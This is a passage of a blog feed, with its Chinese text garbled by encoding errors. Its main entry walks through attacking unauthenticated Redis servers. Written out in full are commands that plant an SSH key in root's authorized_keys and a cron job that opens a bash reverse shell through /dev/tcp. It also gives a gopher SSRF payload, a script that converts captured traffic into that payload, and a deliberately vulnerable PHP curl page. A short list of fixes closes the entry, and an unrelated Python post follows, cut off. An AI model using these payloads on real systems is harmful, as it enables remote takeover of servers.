alt="VoY9iQ.png"></p><p>åœ¨redisé‡Œé¢è®¾ç½®å†™æ“ä½œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCm5rJyVESTrJT1DESSsXJbXrvBKTUPV5wqfmsmCKcWp2ysV/JVP4MUk+NKbVsg8wb4QuU0IueWd+vIi8jLiAEennl01idUujE75BxJ0exKqJ18jJfNemu//RLOmasXrZ9I/NJB5LtVcRDkN8MZevK2zzKxPJuZlH8plL4sLft1kXOHNWORylDQpAodF8qlI1LiKbR6ZRb/1m3Xy8XGzJ4wkdghSJDE1SPAwC5JJq1rVmAoIs6hujrlsy0LHSCAm+fViKPnRIi94NotCKdtyrQqv3VtvblGRfT/h+My4WUjfQLKjocomLDuUGOgBFp6DOAV8BGxX+7KAMm0Z9NAkpaF root@Chan\n\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/06/15/VoYPRs.png" alt="VoYPRs.png"></p><p>æœ€åå°±å¯ä»¥æˆåŠŸè¿æ¥sshï¼Œå®Œå…¨ä¸éœ€è¦å¯†ç </p><p><img src="https://s2.ax1x.com/2019/06/15/VoYui4.png" alt="VoYui4.png"></p><h4 id="redisè®¾ç½®å®šæ—¶ä»»åŠ¡"><a href="#redisè®¾ç½®å®šæ—¶ä»»åŠ¡" class="headerlink" title="redisè®¾ç½®å®šæ—¶ä»»åŠ¡"></a>redisè®¾ç½®å®šæ—¶ä»»åŠ¡</h4><p>è¿™ä¸ªå°±æ˜¯åˆ©ç”¨ä¸€ä¸ªå†™çš„æ“ä½œå»å®ç°å®šæ—¶ä»»åŠ¡ï¼Œä½†æ˜¯é…è¿™ä¸ªç¯å¢ƒè´¼å‘ã€‚ã€‚ä¸Šé¢çš„Ubuntuéƒ½ä¸èƒ½å®ç°ã€‚ã€‚æˆ‘ç”¨çš„æ˜¯centos</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> 1 <span class="string">"\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.70.147/2444 0&gt;&amp;1\n\n"</span></span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>å®šæ—¶ä»»åŠ¡æ€ä¹ˆè®¾ç½®ï¼Œè¿™ä¸ªå›¾å¾ˆæ¸…æ¥šäº†</p><p><a href="https://www.wuliaole.com/post/what_you_need_to_know_about_cron_and_crontab/crontab.jpg" target="_blank" rel="noopener"><img src="https://www.wuliaole.com/post/what_you_need_to_know_about_cron_and_crontab/crontab.jpg" alt="crontabçš„è¯­æ³•æ ¼å¼"></a></p><p>ç”¨çš„å°±è¿™ä¹ˆå‡ å¥è¯ï¼Œé…ç¯å¢ƒé…ä¸€ä¸ªä¸‹åˆ</p><p><img src="https://s2.ax1x.com/2019/06/15/Vo83sf.png" alt="Vo83sf.png"></p><p>è¿™é‡Œæ³¨æ„åå¼¹shellçš„è¯­å¥è¦åŠ ä¸Šæ¢è¡Œç¬¦ï¼Œä¸ç„¶çš„è¯åœ¨rootæ–‡ä»¶é‡Œé¢æ˜¯æ‰§è¡Œä¸äº†çš„ï¼Œå› ä¸ºä»¥redisæœåŠ¡å†™å…¥çš„å‰é¢ä¼šåŠ ä¸Šä¸€äº›ä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿ï¼Œå¾ˆå¯èƒ½å°±ä¸èƒ½æˆåŠŸæ‰§è¡Œï¼Œå®³æ€•æ‰§è¡Œä¸äº†çš„è¯åŠ å¤šå‡ ä¸ªæ¢è¡Œç¬¦å§ã€‚è¿™ä¹Ÿè§£é‡Šäº†æˆ‘ä¸Šå›¾ä¸ºä½•ä½¿ç”¨tacå»è¯»æ–‡ä»¶ï¼Œç®€å•çš„catæœ‰æ—¶å€™è¿˜è¯»ä¸å‡ºæ¥ï¼Œxxdä¹Ÿå¯ä»¥è¯»</p><p>ç„¶åå¦å¤–ä¸€ä¸ªæœºå­å¼€å§‹ç›‘å¬ï¼ŒæˆåŠŸç›‘å¬</p><p><img src="https://s2.ax1x.com/2019/06/15/Vo8WWR.png" alt="Vo8WWR.png"></p><p>è¿™ä¸ªç¯å¢ƒæœ‰å‡ ä¸ªå‘ç‚¹è¦æ³¨æ„ä¸€ä¸‹ï¼Œç¬¬ä¸€è®¾ç½®å®šæ—¶ä»»åŠ¡ç”¨Ubuntuçš„ç³»ç»Ÿæ˜¯ä¸è¡Œçš„ï¼Œè¯¦æƒ…å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<code>https://joychou.org/hostsec/linux-crontab-rebound-shell-hole.html</code>ï¼Œç½‘ä¸Šå¾ˆå¤šç›´æ¥Ubuntuæˆ–è€…kaliè¾“å…¥é‚£ä¸ªå‘½ä»¤ä¹‹åç„¶åå°±è¯´ç­‰ä¸ªä¸€åˆ†é’Ÿçš„é‚£ç§åšå®¢ï¼ŒçœŸæ˜¯é†‰äº†ï¼Œç¡®å®æ˜¯æœ‰ç‚¹ä¸è´Ÿè´£äº†ã€‚ã€‚ã€‚joychouå¤§ä½¬ä¹Ÿæ€»ç»“äº†ï¼Œä¸ºå•¥ä¸è¡Œçš„åŸå› </p><p>ubuntuåˆ©ç”¨å†™æ–‡ä»¶æ‰§è¡Œcrontabä¸ä¼šæˆåŠŸã€‚åŸå› æœ‰ä¸¤ç‚¹ï¼š</p><ol><li>å¦‚æœå†™<code>/etc/crontab</code>ï¼Œè¯­æ³•ä¸è¯†åˆ«</li><li>å¦‚æœå†™<code>/var/spool/cron/crontabs/root</code>ï¼Œæƒé™ä¸æ˜¯600ï¼Œè€Œä¸”è¯­æ³•ä¹Ÿä¸è¯†åˆ«</li></ol><p>ç¬¬äºŒcurlçš„ç‰ˆæœ¬æ˜¯å¦æ”¯æŒgopherï¼Œå› ä¸ºæˆ‘è¿™é‡Œå®‰è£…çš„centosé»˜è®¤ç‰ˆæœ¬çš„curlä¸æ”¯æŒgopheråè®®ï¼Œphpçš„curlåº•å±‚è°ƒç”¨çš„æ˜¯ç³»ç»Ÿçš„curlï¼Œå°±ä¼šå‡ºç°ä¸€äº›é—®é¢˜ï¼Œå› æ­¤æˆ‘æŠŠå®ƒç»™å‡çº§äº†ã€‚</p><p>JoyChouå¤§ä½¬çš„åšå®¢çš„è¿˜æœ‰ä¸€äº›åˆ©ç”¨ï¼Œä½¿ç”¨gopher åè®®  ï¼Œä¸€èˆ¬æ˜¯å…³è”ä¸Šssrfæ¼æ´çš„ä½¿ç”¨çš„</p><p>åœºæ™¯ï¼š  web ssrfâ€“&gt;gopherâ€“&gt;redis <strong>æ²¡å¯†ç </strong>   â€“&gt; è¿ç”¨cron   â€“&gt;åå¼¹shell</p><h5 id="ä»€ä¹ˆæ˜¯gopheråè®®ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯gopheråè®®ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯gopheråè®®ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯gopheråè®®ï¼Ÿ</h5><p>gopheræ˜¯ä¸€ä¸ªäº’è”ç½‘ä¸Šä½¿ç”¨çš„åˆ†å¸ƒå‹çš„æ–‡ä»¶æœé›†è·å–ç½‘ç»œåè®®</p><p>gopheråè®®æ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚:å¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­â€“ä¸ªæœ€å¼ºå¤§çš„åè®®(ä¿—ç§°ä¸‡èƒ½åè®®)ã€‚</p><p>ä½¿ç”¨gopherè¯·æ±‚ï¼Œé¦–å…ˆä½ å¾—æŠ“å‡ºæµé‡æ‰è¡Œï¼Œåˆ©ç”¨socatåšä¸€ä¸ªç«¯å£è½¬å‘ï¼Œæ³¨æ„è¿™é‡Œçš„æµé‡ï¼Œæ˜¯ä¸ºäº†æˆ‘ä»¬èƒ½å¤Ÿä½¿ç”¨gopherè€Œåˆ©ç”¨åœ¨æœ¬åœ°æµ‹è¯•æŠ“çš„</p><p>æœ¬åœ°åˆ©ç”¨ä¸€ä¸ªshellè„šæœ¬å’Œsocatåšä¸€ä¸ªæµé‡æŠ“å–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\n"</span>|redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="built_in">set</span> 1</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dbfilename root</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> save</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> quit</span><br></pre></td></tr></table></figure><p>å…ˆåšä¸€ä¸ªç«¯å£è½¬å‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</span><br></pre></td></tr></table></figure><p>å†è¿è¡Œä¸Šé¢é‚£ä¸ªshellè„šæœ¬ï¼Œæ„æ€æ˜¯å°†æœ¬åœ°çš„4444ç«¯å£è½¬å‘åˆ°æœ¬åœ°çš„6379ç«¯å£ã€‚è®¿é—®è¯¥æœåŠ¡å™¨çš„4444ç«¯å£ï¼Œè®¿é—®çš„å…¶å®æ˜¯è¯¥æœåŠ¡å™¨çš„6379ç«¯å£ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis.sh 127.0.0.1 4444</span><br></pre></td></tr></table></figure><p>ç›‘å¬çš„è¿™è¾¹ä¼šæŠ“åˆ°æµé‡ï¼Œä¿å­˜ä¸‹æ¥å³å¯ï¼Œä¿å­˜åœ¨socat.log</p><p><img src="https://s2.ax1x.com/2019/06/16/VTI8EV.png" alt="VTI8EV.png"></p><p>ç„¶åå¯¹æµé‡è¿›è¡Œè½¬æ¢ä¸€ä¸‹ï¼Œé™„ä¸Šjoychouå¤§ä½¬çš„è½¬æ¢è„šæœ¬</p><p><img src="https://s2.ax1x.com/2019/06/16/VThwut.png" alt="VThwut.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#author: JoyChou</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">exp = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'&gt;&lt;+'</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># åˆ¤æ–­å€’æ•°ç¬¬2ã€3å­—ç¬¦ä¸²æ˜¯å¦ä¸º\r</span></span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r'\r'</span>:</span><br><span class="line">            <span class="comment"># å¦‚æœè¯¥è¡Œåªæœ‰\rï¼Œå°†\ræ›¿æ¢æˆ%0a%0d%0a</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                exp = exp + <span class="string">'%0a%0d%0a'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = line.replace(<span class="string">r'\r'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">                <span class="comment"># å»æ‰æœ€åçš„æ¢è¡Œç¬¦</span></span><br><span class="line">                line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        <span class="comment"># åˆ¤æ–­æ˜¯å¦æ˜¯ç©ºè¡Œï¼Œç©ºè¡Œæ›¿æ¢ä¸º%0a</span></span><br><span class="line">        <span class="keyword">elif</span> line == <span class="string">'\x0a'</span>:</span><br><span class="line">            exp = exp + <span class="string">'%0a'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            exp = exp + line</span><br><span class="line"><span class="keyword">print</span> exp</span><br></pre></td></tr></table></figure><p>è½¬æ¢è§„åˆ™å¦‚ä¸‹ï¼š</p><ul><li>å¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯<code>&gt;</code>æˆ–è€…<code>&lt;</code>é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¯·æ±‚å’Œè¿”å›çš„æ—¶é—´ã€‚</li><li>å¦‚æœå‰3ä¸ªå­—ç¬¦æ˜¯<code>+OK</code> é‚£ä¹ˆä¸¢å¼ƒè¯¥è¡Œå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¿”å›çš„å­—ç¬¦ä¸²ã€‚</li><li>å°†<code>\r</code>å­—ç¬¦ä¸²æ›¿æ¢æˆ<code>%0d%0a</code></li><li>ç©ºç™½è¡Œæ›¿æ¢ä¸º<code>%0a</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.70.134/2444 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ä¸ªç‚¹è¦æ³¨æ„çš„æ˜¯åœ¨JoyChouè¿™ä½è€å“¥çš„åšå®¢é‡Œé¢è¿˜æåŠä¸€ç‚¹å°±æ˜¯å­—ç¬¦é•¿åº¦çš„é—®é¢˜ï¼Œä»–çš„åšæ–‡æ˜¯ä»¥127.0.0.1ä½œä¸ºä¾‹å­çš„ï¼Œæ‰€ä»¥ä¼šå‡ºç°ä¸‹é¢çš„æƒ…å†µï¼Œå¦‚æœä¸æƒ³è¦è¿™ä¹ˆéº»çƒ¦æœ€å¥½ç›´æ¥åœ¨shellè„šæœ¬ä¸Šæ”¹ä¸€ä¸‹å°±å¥½</p><p><img src="https://s2.ax1x.com/2019/06/16/VThFBV.png" alt="VThFBV.png"></p><p>æœ€ååœ¨ä½ çš„æµé‡å‰é¢åŠ ä¸Šéœ€è¦çš„gopheråè®®<code>gopher://127.0.0.1:6379/_</code>æ„æˆæœ€åçš„payloadï¼Œæ„é€ ä¸€æ®µphpä»£ç å°è¯•ä¸€ä¸‹ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) </span><br><span class="line">&#123; </span><br><span class="line">$link = $_POST[<span class="string">'url'</span>]; </span><br><span class="line">$filename = <span class="string">'./curled/'</span>.rand().<span class="string">'txt'</span>; </span><br><span class="line">$curlobj = curl_init($link); </span><br><span class="line">$fp = fopen($filename,<span class="string">"w"</span>); </span><br><span class="line">curl_setopt($curlobj, CURLOPT_FILE, $fp); </span><br><span class="line">curl_setopt($curlobj, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">curl_exec($curlobj); </span><br><span class="line">curl_close($curlobj); </span><br><span class="line">fclose($fp); </span><br><span class="line">$fp = fopen($filename,<span class="string">"r"</span>); </span><br><span class="line">$result = fread($fp, filesize($filename)); </span><br><span class="line">fclose($fp); </span><br><span class="line"><span class="keyword">echo</span> $result; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"> </span><br><span class="line">&lt;html&gt;&lt;body&gt; </span><br><span class="line"> </span><br><span class="line">&lt;form name=<span class="string">"px"</span> method=<span class="string">"post"</span> action=<span class="string">"./ssrf1.php"</span>&gt; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"url"</span> value=<span class="string">""</span>&gt; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"commit"</span> value=<span class="string">"submit"</span>&gt;</span><br></pre></td></tr></table></figure><p>å¯èƒ½ç¬¦å·å¤ªå¤šéœ€è¦URLç¼–ç ä¸€ä¸‹ï¼Œè¿”å›äº”ä¸ªOK</p><p><img src="https://s2.ax1x.com/2019/06/16/VT4hzd.png" alt="VT4hzd.png"></p><p>å®šæ—¶ä»»åŠ¡æˆåŠŸå†™å…¥ï¼ŒæˆåŠŸåå¼¹shell</p><p><img src="https://s2.ax1x.com/2019/06/16/VT5PoT.png" alt="VT5PoT.png"></p><p><img src="https://s2.ax1x.com/2019/06/16/VT5SLq.png" alt="VT5SLq.png"></p><h3 id="ä¿®å¤çš„ä¾ä¸€äº›å»ºè®®"><a href="#ä¿®å¤çš„ä¾ä¸€äº›å»ºè®®" class="headerlink" title="ä¿®å¤çš„ä¾ä¸€äº›å»ºè®®"></a>ä¿®å¤çš„ä¾ä¸€äº›å»ºè®®</h3><p>1ã€ç¦æ­¢ä¸€äº›é«˜å±å‘½ä»¤</p><p>2ã€ä»¥ä½æƒé™è¿è¡Œ Redis æœåŠ¡</p><p>3ã€ä¸º Redis æ·»åŠ å¯†ç éªŒè¯</p><p>4ã€ç¦æ­¢å¤–ç½‘è®¿é—® Redis</p><p>5ã€ä¿è¯ authorized_keys æ–‡ä»¶çš„å®‰å…¨</p><p>6ã€è®¾ç½®é˜²ç«å¢™ç­–ç•¥</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;ç®€è¿°&quot;&gt;&lt;a href=&quot;#ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;ç®€è¿°&quot;&gt;&lt;/a&gt;ç®€è¿°&lt;/h3&gt;&lt;p&gt;Rediså› é…ç½®ä¸å½“å¯ä»¥æœªæˆæƒè®¿é—®ã€‚æ”»å‡»è€…æ— éœ€è®¤è¯è®¿é—®åˆ°å†…éƒ¨æ•°æ®ï¼Œå¯å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œä¹Ÿå¯ä»¥æ¶æ„æ‰§è¡Œflushallæ¥æ¸…ç©ºæ‰€æœ‰æ•°æ®ã€‚(æœ‰ç‚¹ä¸å‹å¥½ï¼Œå¯èƒ½ç›´æ¥ä¼šå¯¼è‡´å®•æœº)
    
    </summary>
    
      <category term="Redis" scheme="0verwatch.top/categories/Redis/"/>
    
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
      <category term="redis" scheme="0verwatch.top/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>å…³äºpythonä¼ å‚å¼•å‘çš„ä¸€äº›æ€è€ƒ</title>
    <link href="0verwatch.top/python-thinking-1.html"/>
    <id>0verwatch.top/python-thinking-1.html</id>
    <published>2019-04-14T09:22:05.000Z</published>
    <updated>2019-04-14T09:26:20.459Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>äººæ€»æœ‰ä¸ä¼šçš„ï¼Œé‡åˆ°ä¸€äº›é—®é¢˜æ·±ç©¶ä¸‹å»å¿…å®šæœ‰æ‰€æ”¶è·</p></blockquote><p>è¿™ä¸ªé—®é¢˜æ˜¯åœ¨æˆ‘å†™pythonçˆ¬è™«é¡¹ç›®çš„æ—¶å€™çš„ç–‘é—®ï¼Œå¯èƒ½æ˜¯æˆ‘å¤ªèœäº†(ä»¥å‰æ²¡å­¦é€å½»)ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸Šå­¦æœŸå­¦Javaçš„æ—¶å€™æŒ‰å€¼ä¼ é€’çš„ç‰¹ç‚¹ç»™ææ··äº†ï¼Œå› ä¸ºå½“æ—¶åœ¨ç”¨å¤šçº¿ç¨‹çš„ç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜å¤„ç†èµ„æºé˜Ÿåˆ—ï¼Œå‚è€ƒåˆ«äººä»£ç çš„æ—¶å€™çªç„¶è’™äº†ä¸€ä¸‹<a id="more"></a>ï¼Œä½†åæ¥æŸ¥äº†æŸ¥èµ„æ–™å‘ç°åŸæ¥æ˜¯ä¸‹é¢çš„åŸå› ï¼Œå€¼å¾—è®°å½•ä¸€ä¸‹å‘ç‚¹ï¼Œé¡ºä¾¿å½“å¤ä¹ ï¼Œå¯¹è¯­è¨€æœ‰ä¸ªæ›´æ·±å…¥çš„ç†è§£ä¹ŸæŒºå¥½çš„</p><h4 id="å‰ç½®çš„ä¸€äº›çŸ¥è¯†"><a href="#å‰ç½®çš„ä¸€äº›çŸ¥è¯†" class="headerlink" title="å‰ç½®çš„ä¸€äº›çŸ¥è¯†"></a>å‰ç½®çš„ä¸€äº›çŸ¥è¯†</h4><ol><li><p>åœ¨pythoné‡Œé¢ä¸€åˆ‡çš†ä¸ºå¯¹è±¡ï¼Œè€Œè¿™ä¸ªå¯¹è±¡åˆ†æˆä¸¤ç§ç±»å‹ï¼Œç¬¬ä¸€ç§æ˜¯å¯å˜çš„ï¼Œå¦å¤–ä¸€ç§æ˜¯ä¸å¯å˜çš„ã€‚</p></li><li><p>æŒ‰å€¼ä¼ é€’ï¼šä¼šåœ¨å †ä¸­å»ºç«‹ä¸€ä¸ªæ–°çš„å‰¯æœ¬ï¼Œä»¥åæ“ä½œåªå¯¹å‰¯æœ¬æ“ä½œï¼Œå¯¹åŸæ¥ä¸»å‡½æ•°é‡Œé¢çš„å€¼ä¸å½±å“ã€‚</p><p>æŒ‰å¼•ç”¨ä¼ é€’ï¼šä¼šåœ¨å †ä¸­å»ºç«‹ä¸€ä¸ªåœ°å€çš„å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯å‚æ•°çš„åœ°å€ï¼Œä¸€æ—¦æ”¹å˜è¿™ä¸ªå€¼å°±ä¼šæŠŠä¸»å‡½æ•°é‡Œé¢çš„å˜é‡ä¹Ÿä¼šæ”¹å˜ã€‚</p></li></ol><h4 id="åšä¸€äº›éªŒè¯"><a href="#åšä¸€äº›éªŒè¯" class="headerlink" title="åšä¸€äº›éªŒè¯"></a>åšä¸€äº›éªŒè¯</h4><p>è¿™é‡Œæˆ‘ä»¥å‚è€ƒçš„ä»£ç é‡Œé¢çš„ä¸€éƒ¨åˆ†è¿›è¡ŒéªŒè¯ï¼Œè¿™é‡Œç”¨ç±»å»ç±»æ¯”ä¸€ä¸‹å‡½æ•°ï¼Œä¸€æ ·çš„æ•ˆæœï¼Œé€šè¿‡idå‚æ•°æ‰“å°ä¸€ä¸‹åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Consumer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,page_queue,*args,**kwargs)</span>:</span></span><br><span class="line">        super(Consumer, self).__init__(*args,**kwargs)</span><br><span class="line">        self.page_queue = page_queue</span><br><span class="line">        print(id(self.page_queue))</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">page_queue = <span class="number">1</span></span><br><span class="line">print(id(page_queue))</span><br><span class="line">c = Consumer(page_queue)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœæ˜¯è¿™æ ·çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">140722209422880</span><br><span class="line">140722209422880</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ä¸¤å¤„çš„åœ°å€æ˜¯ä¸€æ ·çš„ï¼Œå¯ä»¥è„‘è¡¥ä¸€ä¸‹å›¾åº”è¯¥æ˜¯è¿™æ ·çš„ï¼Œå¥½åƒæ˜¯å¼•ç”¨ä¼ å€¼ï¼Œåˆ°åº•æ˜¯ä¸æ˜¯è¿™æ ·çš„å‘¢ï¼Ÿ</p><p><img src="https://s2.ax1x.com/2019/04/14/AO7U9f.png" alt="AO7U9f.png"></p><p>å†æ¥ä¸€æ®µä»£ç éªŒè¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Consumer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,page_queue,*args,**kwargs)</span>:</span></span><br><span class="line">        super(Consumer, self).__init__(*args,**kwargs)</span><br><span class="line">        self.page_queue = page_queue</span><br><span class="line">        print(id(self.page_queue))</span><br><span class="line">        self.page_queue += <span class="number">1</span></span><br><span class="line">        print(id(self.page_queue))</span><br><span class="line">        print(id(page_queue),page_queue)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">page_queue = <span class="number">1</span></span><br><span class="line">print(id(page_queue))</span><br><span class="line">c = Consumer(page_queue)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>ç»“æœæ˜¯è¿™ä¸ªæ ·å­çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">140722209422880</span><br><span class="line">140722209422880</span><br><span class="line">140722209422912</span><br><span class="line">140722209422880 1</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ï¼Œä»¥æœ¬æ¥å¼•ç”¨çš„å¸¸è§„æ€è·¯å»çœ‹çš„è¯ï¼Œè¿™æ ·çš„æ“ä½œåº”è¯¥ä¼šå¯¹åŒä¸€ä¸ªåœ°å€çš„ä¸œè¥¿ä¿®æ”¹äº†æ‰å¯¹ï¼Œä½ 